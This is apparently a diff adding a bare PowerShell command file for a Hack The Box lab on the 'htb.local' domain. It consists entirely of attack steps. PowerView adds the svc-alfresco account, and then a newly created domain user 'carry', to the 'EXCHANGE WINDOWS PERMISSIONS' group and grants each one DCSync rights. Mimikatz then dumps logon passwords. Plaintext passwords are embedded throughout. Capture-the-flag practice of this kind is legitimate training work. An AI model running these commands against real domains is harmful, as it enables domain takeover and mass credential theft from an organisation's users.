@@ -1,0 +1,19 @@
+Import-Module .\PowerView.ps1
+$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
+Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco' -Credential $Cred
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync -PrincipalIdentity svc-alfresco
+
+net user carry carry123456 /add /domain
+
+Import-Module .\PowerView.ps1
+$SecPassword = ConvertTo-SecureString 'carry123456' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\carry', $SecPassword)
+Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'carry' -Credential $Cred
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync -PrincipalIdentity carry
+
+
+
+
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"' 'exit'
